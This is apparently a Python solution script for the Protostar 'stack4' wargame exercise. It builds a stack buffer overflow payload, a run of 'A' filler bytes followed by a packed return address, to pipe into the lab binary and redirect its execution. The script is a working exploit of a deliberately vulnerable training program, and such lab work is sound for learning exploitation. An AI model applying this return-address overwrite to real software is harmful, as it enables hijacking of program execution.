#!/usr/bin/env python
#
# Usage: python stack4_exploit.py BUFFER_OVERFLOW_SIZE | /opt/protostar/bin/stack4
# Example: python stack4_exploit.py 76 | /opt/protostar/bin/stack4
#

import struct
import sys

DESIRED_VALUE = 0x080483f4

buffer_overflow_size = int(sys.argv[1])

fill = b'A' * buffer_overflow_size 

payload = fill + struct.pack('I', DESIRED_VALUE)

# get write function for python3 or 2
try:
    print_function = sys.stdout.buffer.write
except:
    print_function = sys.stdout.write

print_function(payload)

